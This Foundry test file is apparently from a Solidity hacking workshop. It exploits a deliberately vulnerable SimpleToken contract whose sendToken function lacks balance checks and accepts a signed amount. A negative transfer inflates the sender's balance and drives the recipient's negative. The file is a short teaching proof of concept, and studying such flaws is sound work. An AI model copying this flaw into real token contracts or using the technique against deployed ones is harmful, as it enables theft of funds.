// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {SimpleToken} from "../src/SolidityHackingWorkshopV8.sol";

contract CounterTest is Test {
    SimpleToken public simpleToken;

    function setUp() public {
        simpleToken = new SimpleToken();
    }

    /**
     * In SendToken function there are no checks of balance as well as,
     * int type is used for amount and it can put the balance of
     * recipient in negative.
     */

    function test_SendToken() public {
        address recipient = vm.addr(1);
        require(
            simpleToken.balances(address(this)) == 1000 ether,
            "invalid balance"
        );
        simpleToken.sendToken(recipient, -100 ether);

        require(
            simpleToken.balances(address(this)) == 1100 ether,
            "invalid owner balance"
        );
        require(
            simpleToken.balances(recipient) == -100 ether,
            "invalid recipient balance"
        );
    }
}
